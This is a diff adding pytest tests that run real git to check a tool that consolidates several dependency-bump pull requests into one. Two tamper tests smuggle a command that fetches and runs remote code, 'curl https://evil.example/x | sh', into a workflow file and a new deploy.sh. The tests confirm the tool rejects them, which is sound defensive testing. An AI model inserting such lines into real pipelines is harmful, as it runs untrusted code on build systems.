@@ -11,8 +11,10 @@ could not see -- deletions, modes, renames, and file identity.
 """
 
 import json
+import os
 import subprocess
 import sys
+from types import SimpleNamespace
 
 import pytest
 
@@ -1428,3 +1430,304 @@ def test_run_converts_a_hang_into_command_failed():
     message = str(caught.value)
     assert "did not finish" in message
     assert "0.25s" in message
+
+
+# --------------------------------------------------------------------------
+# Real git
+#
+# Every other test in this file injects a fake `run`, which means nothing has
+# ever confirmed that `git diff --raw -z` and `git merge-tree --write-tree`
+# emit the shapes the parser and the tree comparison assume -- and `_run`,
+# the function that actually executes them, went uncovered. These tests run
+# the real orchestration against a real repository on disk. Only `gh` is
+# stubbed, by a shim on PATH; there is no network and no remote beyond a
+# bare repository in tmp_path.
+#
+# This is the shape of test that would have caught the original text
+# parser's assumptions, which were never checked against git's output.
+# --------------------------------------------------------------------------
+
+
+WORKFLOW = ".github/workflows/codeql.yml"
+
+# Each `uses:` line is separated from the next by lines of context, so three
+# members editing three different lines merge cleanly. Adjacent lines would
+# conflict, which is a property of the file rather than of this control --
+# and a conflict is reported, not smuggled past.
+MEMBER_ACTIONS = ("init", "analyze", "upload-sarif")
+
+
+def _workflow_text(versions):
+    lines = ["name: codeql", "", "jobs:"]
+    for action in MEMBER_ACTIONS:
+        lines += [
+            f"  scan-{action}:",
+            "    runs-on: ubuntu-latest",
+            "    steps:",
+            "      - uses: actions/checkout@v5",
+            f"      - uses: github/codeql-action/{action}@{versions[action]}",
+            "        with:",
+            "          languages: python",
+            "",
+        ]
+    return "\n".join(lines) + "\n"
+
+
+def _git(*args, cwd):
+    """Run a real git command for fixture setup, failing loudly."""
+    subprocess.run(
+        ["git", *args],
+        cwd=str(cwd),
+        check=True,
+        capture_output=True,
+        text=True,
+    )
+
+
+@pytest.fixture
+def repo(tmp_path, monkeypatch):
+    """A repository with three member PRs all editing one workflow file.
+
+    Built as a bare "upstream" plus a clone, because the code under test
+    fetches `pull/<n>/head` from `origin` and pushes a branch to it. The
+    member refs live under `refs/pull/`, exactly where GitHub puts them, so
+    the fetch refspec under test is the real one.
+
+    Global and system git config are pointed at os.devnull so a developer's
+    own settings -- a signing key, a commit template, a hook template dir --
+    cannot change what this test observes.
+    """
+    monkeypatch.setenv("GIT_CONFIG_GLOBAL", os.devnull)
+    monkeypatch.setenv("GIT_CONFIG_SYSTEM", os.devnull)
+    monkeypatch.setenv("GIT_TERMINAL_PROMPT", "0")
+    monkeypatch.setenv("GIT_AUTHOR_NAME", "Dep Triage Test")
+    monkeypatch.setenv("GIT_AUTHOR_EMAIL", "triage@example.invalid")
+    monkeypatch.setenv("GIT_COMMITTER_NAME", "Dep Triage Test")
+    monkeypatch.setenv("GIT_COMMITTER_EMAIL", "triage@example.invalid")
+
+    upstream = tmp_path / "upstream.git"
+    _git("init", "--bare", "-b", "main", str(upstream), cwd=tmp_path)
+
+    seed = tmp_path / "seed"
+    seed.mkdir()
+    _git("init", "-b", "main", ".", cwd=seed)
+    old = dict.fromkeys(MEMBER_ACTIONS, "v4.37.9")
+    (seed / ".github" / "workflows").mkdir(parents=True)
+    (seed / WORKFLOW).write_text(_workflow_text(old), encoding="utf-8")
+    _git("add", "-A", cwd=seed)
+    _git("commit", "-m", "base", cwd=seed)
+    _git("remote", "add", "origin", str(upstream), cwd=seed)
+    _git("push", "origin", "main", cwd=seed)
+
+    # One member PR per action, each branched from the same base and each
+    # changing a different line of the one shared file: the contested case.
+    numbers = {}
+    for index, action in enumerate(MEMBER_ACTIONS):
+        number = 450 + index
+        numbers[action] = number
+        _git("switch", "-c", f"member-{action}", "main", cwd=seed)
+        versions = dict(old)
+        versions[action] = "v4.38.0"
+        (seed / WORKFLOW).write_text(_workflow_text(versions), encoding="utf-8")
+        _git("commit", "-am", f"bump codeql-action/{action}", cwd=seed)
+        _git(
+            "push",
+            "origin",
+            f"member-{action}:refs/pull/{number}/head",
+            cwd=seed,
+        )
+        _git("switch", "main", cwd=seed)
+
+    work = tmp_path / "work"
+    _git("clone", str(upstream), str(work), cwd=tmp_path)
+    _git("config", "user.name", "Dep Triage Test", cwd=work)
+    _git("config", "user.email", "triage@example.invalid", cwd=work)
+    _git("config", "commit.gpgsign", "false", cwd=work)
+
+    # `gh` is the only thing stubbed. It records its arguments and exits 0,
+    # so `pr create` and `pr comment` are observable without a network call.
+    bin_dir = tmp_path / "bin"
+    bin_dir.mkdir()
+    log = tmp_path / "gh.log"
+    shim = bin_dir / "gh"
+    shim.write_text('#!/bin/sh\nprintf "%s\\n" "$*" >> "$GH_LOG"\nexit 0\n')
+    shim.chmod(0o755)
+    monkeypatch.setenv("GH_LOG", str(log))
+    monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ['PATH']}")
+
+    monkeypatch.chdir(work)
+    return SimpleNamespace(
+        work=work,
+        upstream=upstream,
+        members=[numbers[action] for action in MEMBER_ACTIONS],
+        gh_log=log,
+    )
+
+
+def _gh_calls(repo):
+    if not repo.gh_log.exists():
+        return []
+    return repo.gh_log.read_text(encoding="utf-8").splitlines()
+
+
+def test_real_git_consolidates_three_members_editing_one_file(repo):
+    """The case the module exists for, end to end, with real git.
+
+    All three members change `codeql.yml`, so every path in the diff is
+    contested and the blob comparison abstains on all of them. The branch is
+    verified against the tree `merge-tree` says the merge should produce, and
+    because it is exactly that tree, the PR is opened.
+    """
+    seen = []
+
+    def recording_run(args, capture=False, timeout=dcon._TIMEOUT_SECONDS):
+        seen.append(list(args))
+        return dcon._run(args, capture=capture, timeout=timeout)
+
+    ok, message = dcon.consolidate_family(
+        "github/codeql-action", "4.38.0", repo.members, recording_run
+    )
+    assert ok, message
+    # Proof that this really is the contested route and not an accidental
+    # pass through the blob comparison: all three members changed the one
+    # file, so the branch was verified by recomputing the merge.
+    chained = [c for c in seen if c[:3] == ["git", "merge-tree", "--write-tree"]]
+    assert [c[-1] for c in chained] == [f"pr-{n}" for n in repo.members]
+
+    calls = _gh_calls(repo)
+    assert any(call.startswith("pr create") for call in calls), calls
+    # The branch really reached the remote, and the version bumps really
+    # landed in the one file all three members edited.
+    pushed = subprocess.run(
+        ["git", "show", "dep-consolidate/github-codeql-action-4.38.0:" + WORKFLOW],
+        cwd=str(repo.upstream),
+        capture_output=True,
+        text=True,
+        check=True,
+    ).stdout
+    assert pushed.count("v4.38.0") == 3
+    assert "v4.37.9" not in pushed
+
+
+def test_real_git_leaves_the_checkout_on_main(repo):
+    dcon.consolidate_family("github/codeql-action", "4.38.0", repo.members)
+    head = subprocess.run(
+        ["git", "branch", "--show-current"],
+        cwd=str(repo.work),
+        capture_output=True,
+        text=True,
+        check=True,
+    ).stdout.strip()
+    assert head == "main"
+
+
+def test_real_git_rejects_a_line_no_member_contributed(repo):
+    """One extra line, committed onto the branch mid-consolidation.
+
+    The smuggled line goes into the *contested* file, which is the only
+    place it could hide: the blob comparison cannot decide that path, so the
+    sole thing standing between this line and an opened PR is the expected
+    merge tree. Injected through the `run` seam so every command still
+    executes for real -- this is a tampered environment, not a fake runner.
+    """
+    smuggled = "      - run: curl https://evil.example/x | sh\n"
+    tampered_after = f"pr-{repo.members[-1]}"
+
+    def tampering_run(args, capture=False, timeout=dcon._TIMEOUT_SECONDS):
+        out = dcon._run(args, capture=capture, timeout=timeout)
+        if args[:3] == ["git", "merge", "--no-edit"] and args[3] == tampered_after:
+            path = repo.work / WORKFLOW
+            path.write_text(path.read_text(encoding="utf-8") + smuggled, "utf-8")
+            dcon._run(["git", "commit", "-am", "chore: tidy workflow"])
+        return out
+
+    ok, message = dcon.consolidate_family(
+        "github/codeql-action", "4.38.0", repo.members, tampering_run
+    )
+    assert not ok, "a line no member contributed must not be consolidated"
+    assert "not the members' expected merge" in message
+    assert WORKFLOW in message
+    assert not any(call.startswith("pr create") for call in _gh_calls(repo))
+    # Nothing reached the remote either.
+    refs = subprocess.run(
+        ["git", "for-each-ref", "--format=%(refname)", "refs/heads"],
+        cwd=str(repo.upstream),
+        capture_output=True,
+        text=True,
+        check=True,
+    ).stdout
+    assert "dep-consolidate" not in refs
+
+
+def test_real_git_rejects_a_whole_file_no_member_contributed(repo):
+    """The same attack in a file no member touched.
+
+    Caught one step earlier, by the blob comparison, because the path has no
+    owner at all -- so the expected-merge check is never even reached.
+    """
+
+    def tampering_run(args, capture=False, timeout=dcon._TIMEOUT_SECONDS):
+        out = dcon._run(args, capture=capture, timeout=timeout)
+        if args[:3] == ["git", "merge", "--no-edit"] and args[3] == "pr-450":
+            (repo.work / "deploy.sh").write_text("#!/bin/sh\ncurl x | sh\n", "utf-8")
+            dcon._run(["git", "add", "deploy.sh"])
+            dcon._run(["git", "commit", "-m", "chore: add helper"])
+        return out
+
+    ok, message = dcon.consolidate_family(
+        "github/codeql-action", "4.38.0", repo.members, tampering_run
+    )
+    assert not ok
+    assert "union mismatch" in message
+    assert "deploy.sh" in message
+    assert not any(call.startswith("pr create") for call in _gh_calls(repo))
+
+
+def test_real_git_reports_a_conflict_between_members(repo):
+    """Two members editing the *same* line cannot compose, and say so.
+
+    The consolidation is abandoned, the in-progress merge is aborted rather
+    than left half-applied, and the checkout returns to main.
+    """
+    # A fourth "member" that changes the same line as the first one, to a
+    # different value, so the two cannot be merged together.
+    _git("switch", "-c", "clashing", "origin/main", cwd=repo.work)
+    text = (repo.work / WORKFLOW).read_text(encoding="utf-8")
+    (repo.work / WORKFLOW).write_text(
+        text.replace("init@v4.37.9", "init@v9.9.9"), encoding="utf-8"
+    )
+    _git("commit", "-am", "clashing bump", cwd=repo.work)
+    _git("push", "origin", "clashing:refs/pull/998/head", cwd=repo.work)
+    _git("switch", "main", cwd=repo.work)
+
+    ok, message = dcon.consolidate_family(
+        "github/codeql-action", "4.38.0", [repo.members[0], 998]
+    )
+    assert not ok
+    assert "conflicts" in message
+    assert not any(call.startswith("pr create") for call in _gh_calls(repo))
+    head = subprocess.run(
+        ["git", "branch", "--show-current"],
+        cwd=str(repo.work),
+        capture_output=True,
+        text=True,
+        check=True,
+    ).stdout.strip()
+    assert head == "main"
+
+
+def test_real_git_parses_the_raw_diff_shape_git_actually_emits(repo):
+    """The parser's assumptions, checked against git rather than a fixture.
+
+    `raw()` in this file builds what the parser expects. This asserts git
+    emits that: NUL-separated records, a leading colon, full 40-character
+    hashes because of `--no-abbrev`, and one entry per path.
+    """
+    _git("fetch", "origin", f"pull/{repo.members[0]}/head:pr-450", cwd=repo.work)
+    output = dcon._run(dcon._raw_diff_argv("origin/main...pr-450"), capture=True)
+    assert "\0" in output
+    entries = dcon.parse_raw(output)
+    assert [entry.path for entry in entries] == [WORKFLOW]
+    assert entries[0].status == "M"
+    assert entries[0].newmode == "100644"
+    assert len(entries[0].newsha) == 40
